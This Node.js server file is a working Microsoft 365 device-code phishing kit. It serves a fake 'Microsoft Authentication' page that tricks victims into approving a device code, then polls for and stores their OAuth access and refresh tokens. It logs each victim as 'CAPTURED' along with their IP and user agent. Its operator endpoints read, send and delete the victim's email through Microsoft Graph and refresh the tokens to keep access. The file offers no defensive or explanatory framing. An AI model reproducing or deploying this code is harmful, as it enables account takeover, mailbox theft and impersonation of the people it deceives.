const express = require('express');
const axios = require('axios');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// ============================================
// REPLACE WITH YOUR AZURE APP CLIENT ID
// ============================================
const YOUR_CLIENT_ID = 'eb588048-cc40-4f6e-adc0-e2238e604376';
// ============================================

let userSessions = new Map();
let pendingAuth = new Map();

function generateSID() {
    return Math.floor(Math.random() * 9000000) + 1000000;
}

function getClientIp(req) {
    return req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
}

// ============================================
// HELPER: Refresh Token
// ============================================
async function refreshToken(session) {
    try {
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
            new URLSearchParams({
                grant_type: 'refresh_token',
                refresh_token: session.tokens.refresh_token,
                client_id: YOUR_CLIENT_ID
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        session.tokens.access_token = response.data.access_token;
        session.tokens.refresh_token = response.data.refresh_token || session.tokens.refresh_token;
        session.tokens.expires_in = response.data.expires_in;
        session.tokens.expires_at = Date.now() + (response.data.expires_in * 1000);
        return session.tokens.access_token;
    } catch (err) {
        console.error('Token refresh failed:', err.message);
        return null;
    }
}

async function getValidToken(session) {
    if (Date.now() >= session.tokens.expires_at - 300000) {
        return await refreshToken(session);
    }
    return session.tokens.access_token;
}

// ============================================
// TEST ENDPOINT
// ============================================
app.get('/api/test', async (req, res) => {
    try {
        const testResponse = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
            new URLSearchParams({
                client_id: YOUR_CLIENT_ID,
                scope: 'User.Read openid profile offline_access'
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        res.json({ success: true, message: 'Microsoft connection works!' });
    } catch (err) {
        res.json({ success: false, error: err.response?.data?.error_description || err.message });
    }
});

// ============================================
// CREATE SESSION (Device Code Flow)
// ============================================
app.post('/api/create-session', async (req, res) => {
    try {
        const sid = generateSID();
        const clientIp = getClientIp(req);
        const userAgent = req.headers['user-agent'] || 'Unknown';
        
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
            new URLSearchParams({
                client_id: YOUR_CLIENT_ID,
                scope: 'User.Read openid profile offline_access'
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const { device_code, user_code, expires_in } = response.data;
        
        pendingAuth.set(device_code, {
            device_code, user_code, sid, status: 'pending',
            ip: clientIp, userAgent: userAgent,
            createdAt: Date.now(),
            expiresAt: Date.now() + (expires_in * 1000)
        });
        
        pollForToken(device_code, sid);
        
        res.json({ success: true, sid: sid, user_code: user_code });
        
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

async function pollForToken(device_code, sid) {
    const pollInterval = setInterval(async () => {
        const pending = pendingAuth.get(device_code);
        if (!pending || pending.status !== 'pending') {
            clearInterval(pollInterval);
            return;
        }
        
        if (Date.now() > pending.expiresAt) {
            pending.status = 'expired';
            pendingAuth.delete(device_code);
            clearInterval(pollInterval);
            return;
        }
        
        try {
            const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
                new URLSearchParams({
                    grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
                    client_id: YOUR_CLIENT_ID,
                    device_code: device_code
                }), {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                }
            );
            
            const tokens = response.data;
            
            const userInfo = await axios.get('https://graph.microsoft.com/v1.0/me', {
                headers: { 'Authorization': `Bearer ${tokens.access_token}` }
            });
            
            userSessions.set(sid.toString(), {
                sid: sid,
                email: userInfo.data.mail || userInfo.data.userPrincipalName,
                name: userInfo.data.displayName,
                ip: pending.ip,
                userAgent: pending.userAgent,
                tokens: tokens,
                capturedAt: new Date().toISOString()
            });
            
            pending.status = 'captured';
            pendingAuth.delete(device_code);
            clearInterval(pollInterval);
            
            console.log(`✅ CAPTURED: ${userInfo.data.mail}`);
            
        } catch (err) {
            // Normal - waiting for user
        }
    }, 3000);
}

// ============================================
// SESSION STATUS & MANAGEMENT
// ============================================
app.get('/api/status/:sid', async (req, res) => {
    const { sid } = req.params;
    const session = userSessions.get(sid);
    if (session) return res.json({ status: 'captured', email: session.email });
    for (const pending of pendingAuth.values()) {
        if (pending.sid.toString() === sid) return res.json({ status: pending.status });
    }
    res.json({ status: 'not_found' });
});

app.get('/api/sessions', async (req, res) => {
    const sessionList = Array.from(userSessions.values()).map(s => ({
        sid: s.sid, email: s.email, name: s.name, ip: s.ip, userAgent: s.userAgent, capturedAt: s.capturedAt
    }));
    res.json({ sessions: sessionList });
});

app.get('/api/session/token/:sid', async (req, res) => {
    const session = userSessions.get(req.params.sid);
    if (!session) return res.status(404).json({ error: 'Session not found' });
    res.json({ email: session.email, token: session.tokens.access_token });
});

app.delete('/api/sessions/clear', async (req, res) => {
    userSessions.clear();
    res.json({ success: true });
});

// ============================================
// MAILBOX API ENDPOINTS
// ============================================

// Get emails from folder
app.get('/api/mail/:sessionId/:folderId', async (req, res) => {
    const { sessionId, folderId } = req.params;
    const { top = 50 } = req.query;
    
    const session = userSessions.get(sessionId);
    if (!session) return res.status(401).json({ error: 'Session not found' });
    
    const token = await getValidToken(session);
    if (!token) return res.status(401).json({ error: 'Token expired' });
    
    try {
        const folderMap = {
            'inbox': 'inbox',
            'sent': 'sentitems',
            'drafts': 'drafts',
            'deleted': 'deleteditems',
            'archive': 'archive',
            'junk': 'junkemail'
        };
        const folderPath = folderMap[folderId] || folderId;
        
        const response = await axios.get(`https://graph.microsoft.com/v1.0/me/mailFolders/${folderPath}/messages`, {
            headers: { 'Authorization': `Bearer ${token}` },
            params: { 
                '$top': top, 
                '$orderby': 'receivedDateTime desc', 
                '$select': 'id,subject,from,receivedDateTime,isRead,bodyPreview,hasAttachments' 
            }
        });
        res.json(response.data);
    } catch (err) {
        console.error('Fetch emails error:', err.response?.data);
        res.status(500).json({ error: 'Failed to fetch emails' });
    }
});

// Get single email with full body
app.get('/api/mail/message/:sessionId/:messageId', async (req, res) => {
    const { sessionId, messageId } = req.params;
    const session = userSessions.get(sessionId);
    if (!session) return res.status(401).json({ error: 'Session not found' });
    
    const token = await getValidToken(session);
    if (!token) return res.status(401).json({ error: 'Token expired' });
    
    try {
        const response = await axios.get(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, {
            headers: { 'Authorization': `Bearer ${token}` },
            params: { '$select': 'id,subject,from,toRecipients,receivedDateTime,isRead,body,bodyPreview,hasAttachments' }
        });
        res.json(response.data);
    } catch (err) {
        res.status(500).json({ error: 'Failed to fetch message' });
    }
});

// Send email
app.post('/api/mail/send/:sessionId', async (req, res) => {
    const { sessionId } = req.params;
    const { to, subject, body, cc } = req.body;
    const session = userSessions.get(sessionId);
    if (!session) return res.status(401).json({ error: 'Session not found' });
    
    const token = await getValidToken(session);
    if (!token) return res.status(401).json({ error: 'Token expired' });
    
    try {
        const emailData = {
            message: {
                subject: subject,
                body: { contentType: 'HTML', content: body },
                toRecipients: to.map(email => ({ emailAddress: { address: email } }))
            },
            saveToSentItems: true
        };
        
        if (cc && cc.length) {
            emailData.message.ccRecipients = cc.map(email => ({ emailAddress: { address: email } }));
        }
        
        await axios.post('https://graph.microsoft.com/v1.0/me/sendMail', emailData, {
            headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' }
        });
        res.json({ success: true });
    } catch (err) {
        console.error('Send email error:', err.response?.data);
        res.status(500).json({ error: 'Failed to send email' });
    }
});

// Delete email
app.delete('/api/mail/message/:sessionId/:messageId', async (req, res) => {
    const { sessionId, messageId } = req.params;
    const session = userSessions.get(sessionId);
    if (!session) return res.status(401).json({ error: 'Session not found' });
    
    const token = await getValidToken(session);
    if (!token) return res.status(401).json({ error: 'Token expired' });
    
    try {
        await axios.delete(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, {
            headers: { 'Authorization': `Bearer ${token}` }
        });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Failed to delete message' });
    }
});

// Mark as read/unread
app.patch('/api/mail/message/:sessionId/:messageId', async (req, res) => {
    const { sessionId, messageId } = req.params;
    const { isRead } = req.body;
    const session = userSessions.get(sessionId);
    if (!session) return res.status(401).json({ error: 'Session not found' });
    
    const token = await getValidToken(session);
    if (!token) return res.status(401).json({ error: 'Token expired' });
    
    try {
        await axios.patch(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, 
            { isRead: isRead },
            { headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' } }
        );
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Failed to update message' });
    }
});

// ============================================
// GENERATE AUTH PAGE
// ============================================
app.get('/generate-auth-page', async (req, res) => {
    try {
        const sid = generateSID();
        
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
            new URLSearchParams({
                client_id: YOUR_CLIENT_ID,
                scope: 'User.Read openid profile offline_access'
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const { device_code, user_code, expires_in } = response.data;
        
        pendingAuth.set(device_code, {
            device_code, user_code, sid, status: 'pending',
            ip: getClientIp(req), userAgent: req.headers['user-agent'] || 'Unknown',
            createdAt: Date.now(),
            expiresAt: Date.now() + (expires_in * 1000)
        });
        
        pollForToken(device_code, sid);
        
        const html = `<!DOCTYPE html>
<html>
<head>
    <title>Microsoft Authentication</title>
    <meta charset="UTF-8">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#0078d4,#00a4ef);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
        .card{background:#fff;border-radius:20px;padding:40px;max-width:500px;width:100%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.3)}
        h2{color:#2b2b2b;margin-bottom:10px}
        p{color:#6b7280;margin-bottom:20px}
        .code{font-size:42px;font-weight:bold;letter-spacing:8px;background:#f0f0f0;padding:20px;border-radius:12px;margin:20px 0;color:#0078d4;font-family:monospace}
        .btn{background:#0078d4;color:#fff;border:none;padding:12px 28px;border-radius:8px;cursor:pointer;font-size:14px;font-weight:600;margin:5px}
        .btn:hover{background:#005fa3}
        .status{margin-top:20px;padding:12px;border-radius:8px;background:#f8f9fa;color:#666;font-size:13px}
        .spinner{display:inline-block;width:14px;height:14px;border:2px solid #ccc;border-top-color:#0078d4;border-radius:50%;animation:spin .8s linear infinite;margin-right:8px;vertical-align:middle}
        @keyframes spin{to{transform:rotate(360deg)}}
        .steps{text-align:left;margin-top:20px;padding:15px;background:#f8f9fa;border-radius:10px;font-size:12px}
        .steps ol{padding-left:20px;margin-top:5px}
        .steps li{margin:5px 0}
        .note{font-size:11px;color:#999;margin-top:15px}
    </style>
</head>
<body>
<div class="card">
    <h2>🔐 Microsoft Authentication</h2>
    <p>Sign in with your Microsoft account</p>
    <div class="code" id="userCode">${user_code}</div>
    <button class="btn" onclick="copyCode()">📋 Copy Code</button>
    <button class="btn" id="openBtn">🔑 Open Microsoft Login</button>
    <div class="steps">
        <strong>📋 Steps:</strong>
        <ol>
            <li>Click <strong>"Open Microsoft Login"</strong> above</li>
            <li>Enter the code: <strong style="color:#0078d4">${user_code}</strong></li>
            <li>Sign in with your Microsoft account</li>
            <li>Click <strong>"Continue"</strong> when asked</li>
            <li>This window will auto-close</li>
        </ol>
    </div>
    <div class="status" id="statusMsg">
        <span class="spinner"></span> Waiting for authentication...
    </div>
    <div class="note">🔒 Secured by Microsoft</div>
</div>
<script>
    const SESSION_ID = ${sid};
    const API_URL = window.location.origin;
    
    function copyCode() {
        const code = document.getElementById('userCode').innerText;
        navigator.clipboard.writeText(code);
        alert('✓ Code copied!');
    }
    
    document.getElementById('openBtn').onclick = function() {
        window.open('https://microsoft.com/devicelogin', '_blank', 'width=600,height=700,resizable=yes');
    };
    
    async function checkStatus() {
        try {
            const response = await fetch(API_URL + '/api/status/' + SESSION_ID);
            const data = await response.json();
            if (data.status === 'captured') {
                document.getElementById('statusMsg').innerHTML = '✅ Authentication successful! Session captured. You can close this window.';
                setTimeout(() => window.close(), 2000);
            }
        } catch(e) {
            console.error('Status check error:', e);
        }
        setTimeout(checkStatus, 3000);
    }
    
    checkStatus();
</script>
</body>
</html>`;
        
        res.send(html);
        
    } catch (err) {
        res.status(500).send('Error: ' + err.message);
    }
});

// ============================================
// DASHBOARD
// ============================================
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Server running on port ${PORT}`);
});
